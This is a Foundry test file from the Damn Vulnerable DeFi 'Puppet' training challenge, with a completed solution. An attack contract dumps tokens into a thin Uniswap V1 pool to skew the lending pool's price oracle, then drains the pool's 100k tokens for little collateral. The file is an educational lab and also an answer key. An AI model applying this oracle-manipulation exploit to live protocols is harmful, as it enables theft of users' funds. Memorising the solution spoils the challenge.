// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18; //10 ether
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18; //10 ether
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18; //1k ether
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18; //25 ether
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18; //100k

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate = IUniswapV1Exchange(
            deployCode(
                string.concat(
                    vm.projectRoot(),
                    "/builds/uniswap/UniswapV1Exchange.json"
                )
            )
        );

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(
            deployCode("builds/uniswap/UniswapV1Factory.json")
        );
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(
            uniswapV1Factory.createExchange(address(token))
        );

        // Deploy the lending pool
        lendingPool = new PuppetPool(
            address(token),
            address(uniswapV1Exchange)
        );

        // Add initial token and ETH liquidity to the pool
        token.approve(
            address(uniswapV1Exchange),
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(
                1e18,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(
            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE),
            POOL_INITIAL_TOKEN_BALANCE * 2
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppet() public checkSolvedByPlayer {
        PuppleAttack nithinattacker = new PuppleAttack{value: 11 ether}(
            lendingPool,
            uniswapV1Exchange,
            token,
            recovery
        );
        token.transfer(address(nithinattacker), PLAYER_INITIAL_TOKEN_BALANCE);
        nithinattacker.attack();
    }

    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) private pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(
            token.balanceOf(address(lendingPool)),
            0,
            "Pool still has tokens"
        );
        assertGe(
            token.balanceOf(recovery),
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract PuppleAttack {
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    DamnValuableToken token;
    address recovery;

    constructor(
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        DamnValuableToken _token,
        address _recovery
    ) payable {
        //contract balance =11 etheres at present (in the constructor accepts 11 ethers)
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        token = _token;
        recovery = _recovery;
    }

    function attack() public {
        uint256 _balance = token.balanceOf(address(this)); //PLAYER_INITIAL_ETH_TOKEN-1000DVT
        //Present Uniswap ratio:10DVT/10 ether=1

        token.approve(address(uniswapV1Exchange), _balance); //approve these tokens to exchange
        uniswapV1Exchange.tokenToEthTransferInput(
            _balance,
            9e18, // min_eth   get min eth 9 ethers
            block.timestamp,
            address(this)
        );
        //here send 1000 tokens ,then 1010 tokens,give to user 9 ethers min based on protocol
        //1/1010==0.0009900990099009901
        //so 20 ethers how many dvt tokens borrow
        /// contract balance is 20 ethers (11+9)
        lendingPool.borrow{value: 20e18}(
            token.balanceOf(address(lendingPool)), // Try to drain all pool's DVT liquidity
            recovery
        );
    }

    // to be able to receive ETH (after exchange swap)
    receive() external payable {}
}
